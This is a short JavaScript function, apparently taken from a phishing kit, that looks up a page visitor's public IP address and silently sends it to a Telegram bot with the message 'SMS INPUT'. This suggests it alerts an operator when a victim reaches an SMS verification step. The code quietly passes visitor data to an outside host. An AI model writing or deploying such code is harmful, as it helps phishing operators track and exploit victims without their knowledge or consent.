
function alerte() {
	fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
    // Extract the IP address from the JSON response
    const ip_address = data.ip;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=SMS INPUT ...${ip_address}`;
        fetch(url);

})}
